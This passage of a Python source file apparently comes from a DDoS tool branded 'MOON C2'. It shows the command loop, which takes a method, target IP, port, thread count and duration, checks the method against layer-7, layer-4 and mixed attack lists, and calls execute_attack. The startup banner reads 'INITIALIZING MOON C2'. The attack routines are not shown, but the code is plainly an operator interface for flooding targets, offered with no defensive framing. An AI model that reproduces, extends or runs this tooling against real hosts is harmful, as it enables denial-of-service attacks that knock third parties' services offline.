        elif command in ["credits", "credit"]:
            show_credits_page()
            tw = moon_ui.get_term_width()
            msg = "Press Enter to continue..."
            msg_pad = " " * ((tw - len(msg)) // 2)
            input(f"{msg_pad}{moon_ui.gradient_text(msg)}")
            continue
        elif command in ["home", "clear", "cls"]:
            continue
        else:
            # Try to parse as attack command
            if len(args) >= 5:
                try:
                    method = args[0]
                    ip = args[1]
                    port = int(args[2])
                    threads = int(args[3])
                    duration = int(args[4])
                    
                    # Validate method
                    all_methods = [m[0] for m in METHODS_LAYER7 + METHODS_LAYER4 + METHODS_MIXED]
                    if method not in all_methods:
                        tw = moon_ui.get_term_width()
                        err_msg = f"[!] Unknown method: {method}"
                        err_pad = " " * ((tw - len(err_msg)) // 2)
                        print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}")
                        
                        tip_msg = "Type 'methods' to see available methods."
                        tip_pad = " " * ((tw - len(tip_msg)) // 2)
                        print(f"{tip_pad}{moon_ui.gradient_text(tip_msg)}\n")
                        
                        inp_msg = "Press Enter to continue..."
                        inp_pad = " " * ((tw - len(inp_msg)) // 2)
                        input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")
                        continue
                    
                    # Execute attack
                    execute_attack(method, ip, port, threads, duration)
                    
                    tw = moon_ui.get_term_width()
                    inp_msg = "Press Enter to continue..."
                    inp_pad = " " * ((tw - len(inp_msg)) // 2)
                    input(f"\n{inp_pad}{moon_ui.gradient_text(inp_msg)}")
                    
                except ValueError as e:
                    tw = moon_ui.get_term_width()
                    err_msg = "[!] Invalid parameters. Use: <method> <ip> <port> <threads> <time>"
                    err_pad = " " * ((tw - len(err_msg)) // 2)
                    print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
                    
                    inp_msg = "Press Enter to continue..."
                    inp_pad = " " * ((tw - len(inp_msg)) // 2)
                    input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")
            else:
                tw = moon_ui.get_term_width()
                err_msg = "[!] Invalid command. Type 'help' for usage."
                err_pad = " " * ((tw - len(err_msg)) // 2)
                print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
                
                inp_msg = "Press Enter to continue..."
                inp_pad = " " * ((tw - len(inp_msg)) // 2)
                input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")


######################################################################
# ---- PROGRAM ENTRY POINT ----
######################################################################
if __name__ == "__main__":
    try:
        clear_screen()
        W = 40
        pad = moon_ui.centered_pad(W)
        print()
        print(pad + moon_ui.box_top(W))
        print(pad + moon_ui.box_row("INITIALIZING MOON C2...", W))
        print(pad + moon_ui.box_bot(W))
        print()
        time.sleep(1)

        main_loop()

    except KeyboardInterrupt:
        print()
        moon_ui.print_gradient_line("Shutdown.", center=True)
        print()
    except Exception as e:
        print(f"\n  {moon_ui.gradient_text(f'[!] Fatal error: {e}')}\n")
